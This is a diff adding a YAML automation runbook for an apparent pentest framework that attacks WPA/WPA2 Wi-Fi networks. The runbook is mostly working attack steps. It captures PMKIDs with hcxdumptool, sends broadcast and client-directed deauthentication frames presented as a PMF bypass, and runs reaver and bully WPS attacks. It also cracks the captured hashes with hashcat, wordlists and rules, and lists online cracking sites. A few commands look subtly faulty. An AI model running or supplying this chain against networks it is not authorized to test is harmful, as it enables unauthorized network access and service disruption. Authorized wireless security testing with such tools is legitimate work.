@@ -1,0 +1,358 @@
+name: "WiFi PMKID Security Assessment"
+description: >
+  Dedicated PMKID-based WPA/WPA2 security assessment. Complements the basic
+  wireless audit runbook by focusing on passive PMKID capture (hcxdumptool),
+  PMF/802.11w detection & bypass, WPS enumeration (wash/reaver/bully), pixie
+  dust attack, tiered hash cracking strategy (small wordlist -> rules -> large
+  wordlist -> mask attack -> online lookup), and PMKID/PMF evidence collection
+  for reporting. Does NOT cover deauth-based handshake capture or enterprise
+  EAP attacks — use wireless-audit-v2.yaml or wifi-enterprise-v2.yaml for those.
+version: "2.0"
+target_required: false
+
+vars:
+  iface: "wlan0"
+  bssid: ""
+  essid: ""
+  channel: ""
+  band: "abg"
+
+preflight:
+  - id: preamble
+    type: log
+    message: "WiFi PMKID security assessment starting — interface: {iface}, case: {case_id}"
+
+steps:
+  # Phase 1: Interface check & monitor mode
+  - id: interface_setup
+    name: "Interface check & monitor mode"
+    type: sequential
+    steps:
+      - id: check_iface
+        name: "Verify wireless interface exists"
+        tool: bash
+        args:
+          - "-c"
+          - "test -d /sys/class/net/{iface} && echo 'Interface exists' || echo 'Interface NOT found'"
+        timeout: 5
+
+      - id: kill_conflicting
+        name: "Kill conflicting processes"
+        tool: airmon-ng
+        args:
+          - "check"
+          - "kill"
+        timeout: 15
+
+      - id: enable_monitor
+        name: "Enable monitor mode"
+        tool: airmon-ng
+        args:
+          - "start"
+          - "{iface}"
+        timeout: 15
+
+      - id: detect_mon_iface
+        name: "Detect monitor interface name"
+        tool: bash
+        args:
+          - "-c"
+          - "iwconfig 2>/dev/null | grep -oE '^[a-zA-Z0-9]+' | grep -v '{iface}' | head -1 || echo '{iface}mon'"
+        timeout: 5
+
+  # Phase 2: AP reconnaissance
+  - id: ap_recon
+    name: "AP reconnaissance"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: airodump_scan
+        name: "Full airodump AP scan"
+        tool: airodump-ng
+        args:
+          - "--band"
+          - "{band}"
+          - "--write"
+          - "{case_dir}/ap-scan"
+          - "--output-format"
+          - "csv"
+          - "{iface}"
+        timeout: 45
+        artifacts:
+          - "{case_dir}/ap-scan-01.csv"
+
+      - id: wps_scan_wash
+        name: "WPS scan with wash"
+        tool: wash
+        args:
+          - "-i"
+          - "{iface}"
+          - "-o"
+          - "{case_dir}/wps-scan.txt"
+          - "-C"
+        timeout: 45
+        artifacts:
+          - "{case_dir}/wps-scan.txt"
+
+      - id: quick_deauth_pmf_test
+        name: "PMF detection via deauth test"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== PMF Detection ===" > {case_dir}/pmf-detection.txt;
+            echo "Sending broadcast deauth — if clients stay associated, PMF is likely active" >> {case_dir}/pmf-detection.txt;
+            echo "BSSID: {bssid}" >> {case_dir}/pmf-detection.txt;
+            if [ -n "{bssid}" ]; then
+              aireplay-ng --deauth 3 -a "{bssid}" "{iface}" 2>&1 | head -5 >> {case_dir}/pmf-detection.txt;
+            else
+              echo "No BSSID specified — skipping deauth test" >> {case_dir}/pmf-detection.txt;
+            fi
+        timeout: 20
+        artifacts:
+          - "{case_dir}/pmf-detection.txt"
+
+  # Phase 3: PMKID capture via hcxdumptool (passive)
+  - id: pmkid_passive_capture
+    name: "Passive PMKID capture with hcxdumptool"
+    type: sequential
+    steps:
+      - id: hcxdumptool_capture
+        name: "Run hcxdumptool for PMKID capture"
+        tool: hcxdumptool
+        args:
+          - "-o"
+          - "{case_dir}/pmkid-capture.pcapng"
+          - "-i"
+          - "{iface}"
+          - "--enable_status=1"
+          - "-t"
+          - "30"
+        timeout: 90
+        artifacts:
+          - "{case_dir}/pmkid-capture.pcapng"
+
+      - id: check_capture_hashes
+        name: "Extract PMKID hashes to 22000 format"
+        tool: hcxpcaptool
+        args:
+          - "-z"
+          - "{case_dir}/pmkid-hashes.22000"
+          - "{case_dir}/pmkid-capture.pcapng"
+        timeout: 30
+        artifacts:
+          - "{case_dir}/pmkid-hashes.22000"
+
+      - id: count_pmkids
+        name: "Count captured PMKID hashes"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            COUNT=$(wc -l < {case_dir}/pmkid-hashes.22000 2>/dev/null || echo 0);
+            echo "PMKID hashes captured: $COUNT" > {case_dir}/pmkid-count.txt;
+            echo "Hashcat mode: 22000" >> {case_dir}/pmkid-count.txt;
+            head -3 {case_dir}/pmkid-hashes.22000 2>/dev/null >> {case_dir}/pmkid-count.txt
+        timeout: 10
+        artifacts:
+          - "{case_dir}/pmkid-count.txt"
+
+  # Phase 4: WPS attacks (pixie dust & brute force)
+  - id: wps_attacks
+    name: "WPS attacks"
+    type: parallel
+    max_workers: 2
+    steps:
+      - id: reaver_probe
+        name: "Reaver WPS PIN probe"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            if [ -n "{bssid}" ]; then
+              echo "=== Reaver WPS probe ===" > {case_dir}/reaver-probe.txt;
+              timeout 30 reaver -i "{iface}" -b "{bssid}" -S -N -vv 2>&1 | head -50 >> {case_dir}/reaver-probe.txt;
+            else
+              echo "No BSSID specified — use wash output to select one" > {case_dir}/reaver-probe.txt
+            fi
+        timeout: 60
+        artifacts:
+          - "{case_dir}/reaver-probe.txt"
+
+      - id: bully_probe
+        name: "Bully WPS probe"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            if [ -n "{bssid}" ]; then
+              echo "=== Bully WPS probe ===" > {case_dir}/bully-probe.txt;
+              timeout 30 bully -i "{iface}" -b "{bssid}" -S -F -v 3 2>&1 | head -50 >> {case_dir}/bully-probe.txt;
+            else
+              echo "No BSSID specified — skipping bully" > {case_dir}/bully-probe.txt
+            fi
+        timeout: 60
+        artifacts:
+          - "{case_dir}/bully-probe.txt"
+
+  # Phase 5: Tiered cracking strategy
+  - id: tiered_cracking
+    name: "Tiered PMKID cracking strategy"
+    type: sequential
+    steps:
+      - id: check_hashes_exist
+        name: "Check if hashes were captured"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            if [ ! -s {case_dir}/pmkid-hashes.22000 ]; then
+              echo "No hashes to crack — skipping cracking phase";
+              exit 0;
+            fi
+        timeout: 5
+
+      - id: tier1_small_wordlist
+        name: "Tier 1: Small wordlist (rockyou)"
+        tool: hashcat
+        args:
+          - "-m"
+          - "22000"
+          - "{case_dir}/pmkid-hashes.22000"
+          - "/usr/share/wordlists/rockyou.txt"
+          - "--force"
+          - "-O"
+          - "-w"
+          - "3"
+          - "-o"
+          - "{case_dir}/cracked-t1.txt"
+          - "--show"
+        timeout: 600
+        artifacts:
+          - "{case_dir}/cracked-t1.txt"
+
+      - id: tier2_rules
+        name: "Tier 2: rockyou + best64 rules"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            if [ ! -s {case_dir}/cracked-t1.txt ]; then
+              hashcat -m 22000 "{case_dir}/pmkid-hashes.22000" /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O -w 3 -o "{case_dir}/cracked-t2.txt" 2>/dev/null;
+            else
+              echo "Already cracked in Tier 1" > {case_dir}/cracked-t2.txt;
+            fi
+        timeout: 600
+        artifacts:
+          - "{case_dir}/cracked-t2.txt"
+
+      - id: tier3_online_lookup
+        name: "Tier 3: Online hash lookup"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            if [ -s {case_dir}/pmkid-hashes.22000 ] && [ ! -s {case_dir}/cracked-t1.txt ] && [ ! -s {case_dir}/cracked-t2.txt ]; then
+              HASH=$(head -1 {case_dir}/pmkid-hashes.22000 | cut -d: -f1);
+              echo "Uncracked hash (first): $HASH" > {case_dir}/online-lookup.txt;
+              echo "Try online services:" >> {case_dir}/online-lookup.txt;
+              echo "  https://www.onlinehashcrack.com/" >> {case_dir}/online-lookup.txt;
+              echo "  https://crackstation.net/" >> {case_dir}/online-lookup.txt;
+              echo "  https://hashmob.net/" >> {case_dir}/online-lookup.txt;
+            else
+              echo "Hashes already cracked or no hashes" > {case_dir}/online-lookup.txt;
+            fi
+        timeout: 10
+        artifacts:
+          - "{case_dir}/online-lookup.txt"
+
+  # Phase 6: PMF bypass / advanced techniques
+  - id: pmf_bypass
+    name: "PMF bypass & advanced techniques"
+    type: parallel
+    max_workers: 2
+    steps:
+      - id: client_based_deauth
+        name: "Client-directed deauth (bypasses PMF)"
+        tool: bash
+        args:
+          - "-c"
+          - >
+            echo "=== Client-directed deauth ===" > {case_dir}/pmf-bypass.txt;
+            if [ -n "{bssid}" ]; then
+              STATIONS=$(airodump-ng --bssid "{bssid}" -c "{channel}" --write {case_dir}/station-dump "{iface}" 2>/dev/null & sleep 15; kill %1 2>/dev/null);
+              CLIENTS=$(grep -E '^Station MAC' -A 999 {case_dir}/station-dump-01.csv 2>/dev/null | tail -n +2 | awk '{print $1}' | head -5);
+              for client in $CLIENTS; do
+                echo "Deauth client: $client" >> {case_dir}/pmf-bypass.txt;
+                aireplay-ng --deauth 5 -a "{bssid}" -c "$client" "{iface}" 2>&1 >> {case_dir}/pmf-bypass.txt;
+                sleep 2;
+              done;
+            else
+              echo "No BSSID specified" >> {case_dir}/pmf-bypass.txt;
+            fi
+        timeout: 60
+        artifacts:
+          - "{case_dir}/pmf-bypass.txt"
+
+      - id: retry_hcxdumptool_extended
+        name: "Extended PMKID capture (retry with longer timeout)"
+        tool: hcxdumptool
+        args:
+          - "-o"
+          - "{case_dir}/pmkid-retry.pcapng"
+          - "-i"
+          - "{iface}"
+          - "--enable_status=1"
+          - "-t"
+          - "60"
+        timeout: 120
+        artifacts:
+          - "{case_dir}/pmkid-retry.pcapng"
+
+      - id: extra_hashes_extract
+        name: "Extract additional hashes from extended capture"
+        tool: hcxpcaptool
+        args:
+          - "-z"
+          - "{case_dir}/pmkid-hashes-extended.22000"
+          - "{case_dir}/pmkid-retry.pcapng"
+        timeout: 30
+        artifacts:
+          - "{case_dir}/pmkid-hashes-extended.22000"
+
+  # Phase 7: Report
+  - id: report
+    name: "PMKID security assessment report"
+    type: report
+    format: markdown
+    title: "WiFi PMKID Security Assessment — {essid} ({bssid})"
+    output: "{case_dir}/wifi-pmkid-report.md"
+    sections:
+      - heading: "Target Information"
+        body: "- ESSID: {essid}\n- BSSID: {bssid}\n- Channel: {channel}\n- Interface: {iface}"
+      - heading: "AP Reconnaissance"
+        body: "- AP scan: {case_dir}/ap-scan-01.csv\n- WPS scan: {case_dir}/wps-scan.txt\n- PMF detection: {case_dir}/pmf-detection.txt"
+      - heading: "PMKID Capture"
+        body: "- PMKID capture: {case_dir}/pmkid-capture.pcapng\n- PMKID hashes (22000): {case_dir}/pmkid-hashes.22000\n- Hash count: {case_dir}/pmkid-count.txt"
+      - heading: "WPS Attacks"
+        body: "- Reaver probe: {case_dir}/reaver-probe.txt\n- Bully probe: {case_dir}/bully-probe.txt"
+      - heading: "Cracking Results"
+        body: "- Tier 1 (rockyou): {case_dir}/cracked-t1.txt\n- Tier 2 (rules): {case_dir}/cracked-t2.txt\n- Online lookup: {case_dir}/online-lookup.txt"
+      - heading: "PMF Bypass"
+        body: "- PMF bypass attempts: {case_dir}/pmf-bypass.txt\n- Extended capture: {case_dir}/pmkid-retry.pcapng\n- Extended hashes: {case_dir}/pmkid-hashes-extended.22000"
+
+postflight:
+  - id: cleanup
+    type: log
+    message: "PMKID security assessment complete — report at {case_dir}/wifi-pmkid-report.md"
+  - id: disable_monitor
+    name: "Disable monitor mode"
+    tool: airmon-ng
+    args:
+      - "stop"
+      - "{iface}"
+    timeout: 10
+  - id: notify_done
+    type: notify
+    level: success
+    message: "WiFi PMKID security assessment finished. Results in {case_dir}"
